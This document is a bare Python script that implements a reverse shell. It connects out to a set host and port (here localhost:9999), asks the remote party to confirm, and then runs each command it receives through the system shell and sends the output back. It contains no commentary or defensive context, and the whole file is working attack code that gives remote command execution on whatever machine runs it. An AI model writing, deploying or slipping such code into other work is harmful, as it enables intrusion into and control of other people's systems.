#!/usr/bin/python
import subprocess
import os
import socket

host = "127.0.0.1"
port = 9999

def Login():
    global s
    s.send("Found Client: Connect? (y/n): ".encode())
    pwd = s.recv(1024).decode()

    if pwd.strip() != "y":
        Login()
    else:
        s.send("Connected #> ".encode())
        Shell()

def Shell():
    while True:
        data = s.recv(1024).decode()

        if data[:2] == 'cd':
            os.chdir(data[3:].rstrip("\n"))

        if data.strip() == ":kill:":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("#>".encode())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
